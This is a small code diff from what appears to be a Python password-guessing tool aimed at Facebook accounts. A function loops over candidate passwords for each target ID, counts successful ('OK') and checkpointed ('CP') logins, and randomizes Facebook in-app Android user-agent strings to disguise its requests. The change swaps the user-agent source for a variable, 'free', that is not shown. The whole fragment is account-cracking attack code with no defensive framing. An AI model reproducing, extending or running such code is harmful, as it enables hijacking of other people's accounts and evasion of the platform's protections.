@@ -1132,7 +1132,7 @@ def reguler(idf,pwv,awal):
 	prog.update(des,description=f"{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
 	rudalll = [f'Mozilla/5.0 (Linux; Android {str(rr(1,14))}; SM-G780G Build/SP1A.210812.016; wv)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(77,150))}.0{str(rr(4000,4280))}.{str(rr(70,199))} Mobile Safari/537.36[FB_IAB/FB4A; FBAV/397.0.0.23.404;']
-	ua = random.choice(rudalll)
+	ua = random.choice(free)
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
